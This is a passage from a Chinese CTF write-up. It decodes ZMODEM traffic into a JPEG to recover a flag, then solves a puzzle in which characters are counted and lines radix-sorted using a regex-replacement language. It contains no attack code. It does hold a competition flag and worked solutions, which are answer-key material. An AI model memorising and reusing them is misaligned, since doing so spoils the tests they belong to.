<span><span style="color: #403F53">    c </span><span style="color: #994CC3">=</span><span style="color: #403F53"> data[i]</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">if</span><span style="color: #403F53"> c </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">18</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">        esc </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #BC5454">True</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">continue</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">if</span><span style="color: #403F53"> esc:</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> c </span><span style="color: #994CC3">&amp;</span><span style="color: #403F53"> </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">60</span><span style="color: #403F53"> </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">40</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">if</span><span style="color: #403F53"> skip:</span></span>
<span><span style="color: #403F53">                skip </span><span style="color: #994CC3">-=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">else</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">                result.</span><span style="color: #0C969B">append</span><span style="color: #403F53">(</span><span style="color: #4876D6">c </span><span style="color: #994CC3">^</span><span style="color: #4876D6"> </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">40</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">else</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            skip </span><span style="color: #994CC3">+=</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">elif</span><span style="color: #403F53"> skip:</span></span>
<span><span style="color: #403F53">        skip </span><span style="color: #994CC3">-=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">else</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">        result.</span><span style="color: #0C969B">append</span><span style="color: #403F53">(</span><span style="color: #4876D6">c</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    esc </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #BC5454">False</span></span>
<span></span>
<span><span style="color: #994CC3">with</span><span style="color: #403F53"> </span><span style="color: #4876D6">open</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">level2.out</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #111111">&#39;</span><span style="color: #C96765">wb</span><span style="color: #111111">&#39;</span><span style="color: #403F53">) </span><span style="color: #994CC3">as</span><span style="color: #403F53"> f:</span></span>
<span><span style="color: #403F53">    f.</span><span style="color: #0C969B">write</span><span style="color: #403F53">(</span><span style="color: #4876D6">bytes</span><span style="color: #403F53">(</span><span style="color: #4876D6">result</span><span style="color: #403F53">))</span></span></code></pre></div></section>
<p>这个实现是不完善的<span class="mojikumi-line-end">，</span><a href="/images/2023/10/thuctf2023/zserver-flag2-corrupted.jpg">得到的 JPEG 文件</a> 是破损的<span class="mojikumi-line-end">。</span></p>
<p>但是没关系<span class="mojikumi-line-end">，</span>将它调整一下<span class="mojikumi-line-end">：</span></p>
<p><picture><source type="image/webp" srcset="/assets/zserver-flag2-fixed.77866141.webp"><img srcset="/assets/zserver-flag2-fixed.aebaa6e6.png" loading="lazy" src="/assets/zserver-flag2-fixed.aebaa6e6.png" width="600" height="100" alt="flag2-fixed"></picture></p>
<p>可以读出 <code>flag<wbr>{<wbr>t<wbr>***<wbr>f1c_aNa<wbr>*<wbr>y51s<wbr>*<wbr>4<wbr>*<wbr>ZMOD<wbr>*<wbr>M<wbr>}</code><span class="mojikumi-line-end">，</span>根据语义可以猜出 flag 为 <code>flag<wbr>{<wbr>traFf1c_<wbr>aNa1y51s_<wbr>4_<wbr>ZMODEM<wbr>}</code><span class="mojikumi-line-end">。</span></p>
<h2 id="ppc" class="heading"><a href="#ppc" class="heading-anchor" aria-label="章节： PPC" tabindex="-1"></a><span>PPC</span></h2>
<h3 id="关键词过滤喵，谢谢喵" class="heading"><a href="#关键词过滤喵，谢谢喵" class="heading-anchor" aria-label="章节： 关键词过滤喵，谢谢喵" tabindex="-1"></a><span>关键词过滤喵<span class="mojikumi-line-end">，</span>谢谢喵</span></h3>
<h4 id="level-1-喵" class="heading"><a href="#level-1-喵" class="heading-anchor" aria-label="章节： Level 1 喵" tabindex="-1"></a><span>Level 1 喵</span></h4>
<p>数数喵<span class="mojikumi-line-end">，</span>进位喵<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" aria-label="plain text 代码块" data-v-ad49d235>plain text</h5><ile-root id="ile-35"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-35--></div><div class="light:hidden" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><samp><span><span style="color: #d6deeb">    重复把【[^a]】替换成【a】喵</span></span>
<span><span style="color: #d6deeb">循环喵：</span></span>
<span><span style="color: #d6deeb">    把【^$】替换成【0】喵</span></span>
<span><span style="color: #d6deeb">    把【^a】替换成【1】喵</span></span>
<span><span style="color: #d6deeb">    把【0a】替换成【1】喵</span></span>
<span><span style="color: #d6deeb">    把【1a】替换成【2】喵</span></span>
<span><span style="color: #d6deeb">    把【2a】替换成【3】喵</span></span>
<span><span style="color: #d6deeb">    把【3a】替换成【4】喵</span></span>
<span><span style="color: #d6deeb">    把【4a】替换成【5】喵</span></span>
<span><span style="color: #d6deeb">    把【5a】替换成【6】喵</span></span>
<span><span style="color: #d6deeb">    把【6a】替换成【7】喵</span></span>
<span><span style="color: #d6deeb">    把【7a】替换成【8】喵</span></span>
<span><span style="color: #d6deeb">    把【8a】替换成【9】喵</span></span>
<span><span style="color: #d6deeb">    把【^9a】替换成【10】喵</span></span>
<span><span style="color: #d6deeb">    把【09a】替换成【10】喵</span></span>
<span><span style="color: #d6deeb">    把【19a】替换成【20】喵</span></span>
<span><span style="color: #d6deeb">    把【29a】替换成【30】喵</span></span>
<span><span style="color: #d6deeb">    把【39a】替换成【40】喵</span></span>
<span><span style="color: #d6deeb">    把【49a】替换成【50】喵</span></span>
<span><span style="color: #d6deeb">    把【59a】替换成【60】喵</span></span>
<span><span style="color: #d6deeb">    把【69a】替换成【70】喵</span></span>
<span><span style="color: #d6deeb">    把【79a】替换成【80】喵</span></span>
<span><span style="color: #d6deeb">    把【89a】替换成【90】喵</span></span>
<span><span style="color: #d6deeb">    把【^99a】替换成【100】喵</span></span>
<span><span style="color: #d6deeb">    把【099a】替换成【100】喵</span></span>
<span><span style="color: #d6deeb">    把【199a】替换成【200】喵</span></span>
<span><span style="color: #d6deeb">    把【299a】替换成【300】喵</span></span>
<span><span style="color: #d6deeb">    把【399a】替换成【400】喵</span></span>
<span><span style="color: #d6deeb">    把【499a】替换成【500】喵</span></span>
<span><span style="color: #d6deeb">    把【599a】替换成【600】喵</span></span>
<span><span style="color: #d6deeb">    把【699a】替换成【700】喵</span></span>
<span><span style="color: #d6deeb">    把【799a】替换成【800】喵</span></span>
<span><span style="color: #d6deeb">    把【899a】替换成【900】喵</span></span>
<span><span style="color: #d6deeb">    把【^999a】替换成【1000】喵</span></span>
<span><span style="color: #d6deeb">    把【0999a】替换成【1000】喵</span></span>
<span><span style="color: #d6deeb">    把【1999a】替换成【2000】喵</span></span>
<span><span style="color: #d6deeb">    把【2999a】替换成【3000】喵</span></span>
<span><span style="color: #d6deeb">    把【3999a】替换成【4000】喵</span></span>
<span><span style="color: #d6deeb">    把【4999a】替换成【5000】喵</span></span>
<span><span style="color: #d6deeb">    把【5999a】替换成【6000】喵</span></span>
<span><span style="color: #d6deeb">    把【6999a】替换成【7000】喵</span></span>
<span><span style="color: #d6deeb">    把【7999a】替换成【8000】喵</span></span>
<span><span style="color: #d6deeb">    把【8999a】替换成【9000】喵</span></span>
<span><span style="color: #d6deeb">    把【^9999a】替换成【10000】喵</span></span>
<span><span style="color: #d6deeb">    把【09999a】替换成【10000】喵</span></span>
<span><span style="color: #d6deeb">    把【19999a】替换成【20000】喵</span></span>
<span><span style="color: #d6deeb">    把【29999a】替换成【30000】喵</span></span>
<span><span style="color: #d6deeb">    把【39999a】替换成【40000】喵</span></span>
<span><span style="color: #d6deeb">    把【49999a】替换成【50000】喵</span></span>
<span><span style="color: #d6deeb">    把【59999a】替换成【60000】喵</span></span>
<span><span style="color: #d6deeb">    把【69999a】替换成【70000】喵</span></span>
<span><span style="color: #d6deeb">    把【79999a】替换成【80000】喵</span></span>
<span><span style="color: #d6deeb">    把【89999a】替换成【90000】喵</span></span>
<span><span style="color: #d6deeb">    把【^99999a】替换成【100000】喵</span></span>
<span><span style="color: #d6deeb">    把【099999a】替换成【100000】喵</span></span>
<span><span style="color: #d6deeb">    把【199999a】替换成【200000】喵</span></span>
<span><span style="color: #d6deeb">    把【299999a】替换成【300000】喵</span></span>
<span><span style="color: #d6deeb">    把【399999a】替换成【400000】喵</span></span>
<span><span style="color: #d6deeb">    把【499999a】替换成【500000】喵</span></span>
<span><span style="color: #d6deeb">    把【599999a】替换成【600000】喵</span></span>
<span><span style="color: #d6deeb">    把【699999a】替换成【700000】喵</span></span>
<span><span style="color: #d6deeb">    把【799999a】替换成【800000】喵</span></span>
<span><span style="color: #d6deeb">    把【899999a】替换成【900000】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【a】就跳转到【循环喵】喵</span></span>
<span><span style="color: #d6deeb">    谢谢喵</span></span></samp></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><samp><span><span style="color: #403f53">    重复把【[^a]】替换成【a】喵</span></span>
<span><span style="color: #403f53">循环喵：</span></span>
<span><span style="color: #403f53">    把【^$】替换成【0】喵</span></span>
<span><span style="color: #403f53">    把【^a】替换成【1】喵</span></span>
<span><span style="color: #403f53">    把【0a】替换成【1】喵</span></span>
<span><span style="color: #403f53">    把【1a】替换成【2】喵</span></span>
<span><span style="color: #403f53">    把【2a】替换成【3】喵</span></span>
<span><span style="color: #403f53">    把【3a】替换成【4】喵</span></span>
<span><span style="color: #403f53">    把【4a】替换成【5】喵</span></span>
<span><span style="color: #403f53">    把【5a】替换成【6】喵</span></span>
<span><span style="color: #403f53">    把【6a】替换成【7】喵</span></span>
<span><span style="color: #403f53">    把【7a】替换成【8】喵</span></span>
<span><span style="color: #403f53">    把【8a】替换成【9】喵</span></span>
<span><span style="color: #403f53">    把【^9a】替换成【10】喵</span></span>
<span><span style="color: #403f53">    把【09a】替换成【10】喵</span></span>
<span><span style="color: #403f53">    把【19a】替换成【20】喵</span></span>
<span><span style="color: #403f53">    把【29a】替换成【30】喵</span></span>
<span><span style="color: #403f53">    把【39a】替换成【40】喵</span></span>
<span><span style="color: #403f53">    把【49a】替换成【50】喵</span></span>
<span><span style="color: #403f53">    把【59a】替换成【60】喵</span></span>
<span><span style="color: #403f53">    把【69a】替换成【70】喵</span></span>
<span><span style="color: #403f53">    把【79a】替换成【80】喵</span></span>
<span><span style="color: #403f53">    把【89a】替换成【90】喵</span></span>
<span><span style="color: #403f53">    把【^99a】替换成【100】喵</span></span>
<span><span style="color: #403f53">    把【099a】替换成【100】喵</span></span>
<span><span style="color: #403f53">    把【199a】替换成【200】喵</span></span>
<span><span style="color: #403f53">    把【299a】替换成【300】喵</span></span>
<span><span style="color: #403f53">    把【399a】替换成【400】喵</span></span>
<span><span style="color: #403f53">    把【499a】替换成【500】喵</span></span>
<span><span style="color: #403f53">    把【599a】替换成【600】喵</span></span>
<span><span style="color: #403f53">    把【699a】替换成【700】喵</span></span>
<span><span style="color: #403f53">    把【799a】替换成【800】喵</span></span>
<span><span style="color: #403f53">    把【899a】替换成【900】喵</span></span>
<span><span style="color: #403f53">    把【^999a】替换成【1000】喵</span></span>
<span><span style="color: #403f53">    把【0999a】替换成【1000】喵</span></span>
<span><span style="color: #403f53">    把【1999a】替换成【2000】喵</span></span>
<span><span style="color: #403f53">    把【2999a】替换成【3000】喵</span></span>
<span><span style="color: #403f53">    把【3999a】替换成【4000】喵</span></span>
<span><span style="color: #403f53">    把【4999a】替换成【5000】喵</span></span>
<span><span style="color: #403f53">    把【5999a】替换成【6000】喵</span></span>
<span><span style="color: #403f53">    把【6999a】替换成【7000】喵</span></span>
<span><span style="color: #403f53">    把【7999a】替换成【8000】喵</span></span>
<span><span style="color: #403f53">    把【8999a】替换成【9000】喵</span></span>
<span><span style="color: #403f53">    把【^9999a】替换成【10000】喵</span></span>
<span><span style="color: #403f53">    把【09999a】替换成【10000】喵</span></span>
<span><span style="color: #403f53">    把【19999a】替换成【20000】喵</span></span>
<span><span style="color: #403f53">    把【29999a】替换成【30000】喵</span></span>
<span><span style="color: #403f53">    把【39999a】替换成【40000】喵</span></span>
<span><span style="color: #403f53">    把【49999a】替换成【50000】喵</span></span>
<span><span style="color: #403f53">    把【59999a】替换成【60000】喵</span></span>
<span><span style="color: #403f53">    把【69999a】替换成【70000】喵</span></span>
<span><span style="color: #403f53">    把【79999a】替换成【80000】喵</span></span>
<span><span style="color: #403f53">    把【89999a】替换成【90000】喵</span></span>
<span><span style="color: #403f53">    把【^99999a】替换成【100000】喵</span></span>
<span><span style="color: #403f53">    把【099999a】替换成【100000】喵</span></span>
<span><span style="color: #403f53">    把【199999a】替换成【200000】喵</span></span>
<span><span style="color: #403f53">    把【299999a】替换成【300000】喵</span></span>
<span><span style="color: #403f53">    把【399999a】替换成【400000】喵</span></span>
<span><span style="color: #403f53">    把【499999a】替换成【500000】喵</span></span>
<span><span style="color: #403f53">    把【599999a】替换成【600000】喵</span></span>
<span><span style="color: #403f53">    把【699999a】替换成【700000】喵</span></span>
<span><span style="color: #403f53">    把【799999a】替换成【800000】喵</span></span>
<span><span style="color: #403f53">    把【899999a】替换成【900000】喵</span></span>
<span><span style="color: #403f53">    如果看到【a】就跳转到【循环喵】喵</span></span>
<span><span style="color: #403f53">    谢谢喵</span></span></samp></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/filtered-flag1.a64a1687.webp"><img srcset="/assets/filtered-flag1.bf1eebb5.png" loading="lazy" src="/assets/filtered-flag1.bf1eebb5.png" width="560" height="139" alt="flag1 喵"></picture></p>
<h4 id="level-2-喵" class="heading"><a href="#level-2-喵" class="heading-anchor" aria-label="章节： Level 2 喵" tabindex="-1"></a><span>Level 2 喵</span></h4>
<p>根据提示<span class="mojikumi-line-end">，</span>可以使用 emoji 作为分隔符喵<span class="mojikumi-line-end">，</span>然后可以每行分别进行字数统计喵<span class="mojikumi-line-end">，</span>最后进行基数排序喵<span class="mojikumi-line-start">（</span>逐位通过交换相邻逆序对进行稳定排序喵<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" aria-label="plain text 代码块" data-v-ad49d235>plain text</h5><ile-root id="ile-36"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-36--></div><div class="light:hidden" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><samp><span><span style="color: #d6deeb">    重复把【^([^🤔\n]+)$】替换成【\n\1🤔\1\n】喵</span></span>
<span><span style="color: #d6deeb">    重复把【^([^🤔\n]+)\n】替换成【\n\1🤔\1\n】喵</span></span>
<span><span style="color: #d6deeb">    重复把【\n([^🤔\n]+)$】替换成【\n\1🤔\1\n】喵</span></span>
<span><span style="color: #d6deeb">    重复把【\n([^🤔\n]+)\n】替换成【\n\1🤔\1\n】喵</span></span>
<span><span style="color: #d6deeb">    重复把【\n\n】替换成【\n】喵</span></span>
<span><span style="color: #d6deeb">    重复把【(🤔|🙂)[^\n🙂]】替换成【\1🙂】喵</span></span>
<span><span style="color: #d6deeb">    重复把【🤔🙂】替换成【🤔0000🙂】喵</span></span>
<span><span style="color: #d6deeb">字数统计循环喵：</span></span>
<span><span style="color: #d6deeb">    把【0🙂】替换成【1】喵</span></span>
<span><span style="color: #d6deeb">    把【1🙂】替换成【2】喵</span></span>
<span><span style="color: #d6deeb">    把【2🙂】替换成【3】喵</span></span>
<span><span style="color: #d6deeb">    把【3🙂】替换成【4】喵</span></span>
<span><span style="color: #d6deeb">    把【4🙂】替换成【5】喵</span></span>
<span><span style="color: #d6deeb">    把【5🙂】替换成【6】喵</span></span>
<span><span style="color: #d6deeb">    把【6🙂】替换成【7】喵</span></span>
<span><span style="color: #d6deeb">    把【7🙂】替换成【8】喵</span></span>
<span><span style="color: #d6deeb">    把【8🙂】替换成【9】喵</span></span>
<span><span style="color: #d6deeb">    把【09🙂】替换成【10】喵</span></span>
<span><span style="color: #d6deeb">    把【19🙂】替换成【20】喵</span></span>
<span><span style="color: #d6deeb">    把【29🙂】替换成【30】喵</span></span>
<span><span style="color: #d6deeb">    把【39🙂】替换成【40】喵</span></span>
<span><span style="color: #d6deeb">    把【49🙂】替换成【50】喵</span></span>
<span><span style="color: #d6deeb">    把【59🙂】替换成【60】喵</span></span>
<span><span style="color: #d6deeb">    把【69🙂】替换成【70】喵</span></span>
<span><span style="color: #d6deeb">    把【79🙂】替换成【80】喵</span></span>
<span><span style="color: #d6deeb">    把【89🙂】替换成【90】喵</span></span>
<span><span style="color: #d6deeb">    把【099🙂】替换成【100】喵</span></span>
<span><span style="color: #d6deeb">    把【199🙂】替换成【200】喵</span></span>
<span><span style="color: #d6deeb">    把【299🙂】替换成【300】喵</span></span>
<span><span style="color: #d6deeb">    把【399🙂】替换成【400】喵</span></span>
<span><span style="color: #d6deeb">    把【499🙂】替换成【500】喵</span></span>
<span><span style="color: #d6deeb">    把【599🙂】替换成【600】喵</span></span>
<span><span style="color: #d6deeb">    把【699🙂】替换成【700】喵</span></span>
<span><span style="color: #d6deeb">    把【799🙂】替换成【800】喵</span></span>
<span><span style="color: #d6deeb">    把【899🙂】替换成【900】喵</span></span>
<span><span style="color: #d6deeb">    把【0999🙂】替换成【1000】喵</span></span>
<span><span style="color: #d6deeb">    把【1999🙂】替换成【2000】喵</span></span>
<span><span style="color: #d6deeb">    把【2999🙂】替换成【3000】喵</span></span>
<span><span style="color: #d6deeb">    把【3999🙂】替换成【4000】喵</span></span>
<span><span style="color: #d6deeb">    把【4999🙂】替换成【5000】喵</span></span>
<span><span style="color: #d6deeb">    把【5999🙂】替换成【6000】喵</span></span>
<span><span style="color: #d6deeb">    把【6999🙂】替换成【7000】喵</span></span>
<span><span style="color: #d6deeb">    把【7999🙂】替换成【8000】喵</span></span>
<span><span style="color: #d6deeb">    把【8999🙂】替换成【9000】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【🙂】就跳转到【字数统计循环喵】喵</span></span>
<span><span style="color: #d6deeb">排序循环个喵：</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔...[1-9])\n(.*🤔...[0-0])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔...[2-9])\n(.*🤔...[0-1])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔...[3-9])\n(.*🤔...[0-2])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔...[4-9])\n(.*🤔...[0-3])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔...[5-9])\n(.*🤔...[0-4])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔...[6-9])\n(.*🤔...[0-5])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔...[7-9])\n(.*🤔...[0-6])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔...[8-9])\n(.*🤔...[0-7])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔...[9-9])\n(.*🤔...[0-8])\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔...[1-9])\n(.*🤔...[0-0])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔...[2-9])\n(.*🤔...[0-1])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔...[3-9])\n(.*🤔...[0-2])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔...[4-9])\n(.*🤔...[0-3])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔...[5-9])\n(.*🤔...[0-4])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔...[6-9])\n(.*🤔...[0-5])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔...[7-9])\n(.*🤔...[0-6])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔...[8-9])\n(.*🤔...[0-7])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔...[9-9])\n(.*🤔...[0-8])\n】就跳转到【排序循环个喵】喵</span></span>
<span><span style="color: #d6deeb">排序循环十喵：</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔..[1-9].)\n(.*🤔..[0-0].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔..[2-9].)\n(.*🤔..[0-1].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔..[3-9].)\n(.*🤔..[0-2].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔..[4-9].)\n(.*🤔..[0-3].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔..[5-9].)\n(.*🤔..[0-4].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔..[6-9].)\n(.*🤔..[0-5].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔..[7-9].)\n(.*🤔..[0-6].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔..[8-9].)\n(.*🤔..[0-7].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔..[9-9].)\n(.*🤔..[0-8].)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔..[1-9].)\n(.*🤔..[0-0].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔..[2-9].)\n(.*🤔..[0-1].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔..[3-9].)\n(.*🤔..[0-2].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔..[4-9].)\n(.*🤔..[0-3].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔..[5-9].)\n(.*🤔..[0-4].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔..[6-9].)\n(.*🤔..[0-5].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔..[7-9].)\n(.*🤔..[0-6].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔..[8-9].)\n(.*🤔..[0-7].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔..[9-9].)\n(.*🤔..[0-8].)\n】就跳转到【排序循环十喵】喵</span></span>
<span><span style="color: #d6deeb">排序循环百喵：</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔.[1-9]..)\n(.*🤔.[0-0]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔.[2-9]..)\n(.*🤔.[0-1]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔.[3-9]..)\n(.*🤔.[0-2]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔.[4-9]..)\n(.*🤔.[0-3]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔.[5-9]..)\n(.*🤔.[0-4]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔.[6-9]..)\n(.*🤔.[0-5]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔.[7-9]..)\n(.*🤔.[0-6]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔.[8-9]..)\n(.*🤔.[0-7]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔.[9-9]..)\n(.*🤔.[0-8]..)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔.[1-9]..)\n(.*🤔.[0-0]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔.[2-9]..)\n(.*🤔.[0-1]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔.[3-9]..)\n(.*🤔.[0-2]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔.[4-9]..)\n(.*🤔.[0-3]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔.[5-9]..)\n(.*🤔.[0-4]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔.[6-9]..)\n(.*🤔.[0-5]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔.[7-9]..)\n(.*🤔.[0-6]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔.[8-9]..)\n(.*🤔.[0-7]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔.[9-9]..)\n(.*🤔.[0-8]..)\n】就跳转到【排序循环百喵】喵</span></span>
<span><span style="color: #d6deeb">排序循环千喵：</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔[1-9]...)\n(.*🤔[0-0]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔[2-9]...)\n(.*🤔[0-1]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔[3-9]...)\n(.*🤔[0-2]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔[4-9]...)\n(.*🤔[0-3]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔[5-9]...)\n(.*🤔[0-4]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔[6-9]...)\n(.*🤔[0-5]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔[7-9]...)\n(.*🤔[0-6]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔[8-9]...)\n(.*🤔[0-7]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    把【\n(.*🤔[9-9]...)\n(.*🤔[0-8]...)\n】替换成【\n\2\n\1\n】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔[1-9]...)\n(.*🤔[0-0]...)\n】就跳转到【排序循环千喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔[2-9]...)\n(.*🤔[0-1]...)\n】就跳转到【排序循环千喵】喵</span></span>
<span><span style="color: #d6deeb">    如果看到【\n(.*🤔[3-9]...)\n(.*🤔[0-2]...)\n】就跳转到【排序循环千喵】喵</span></span>
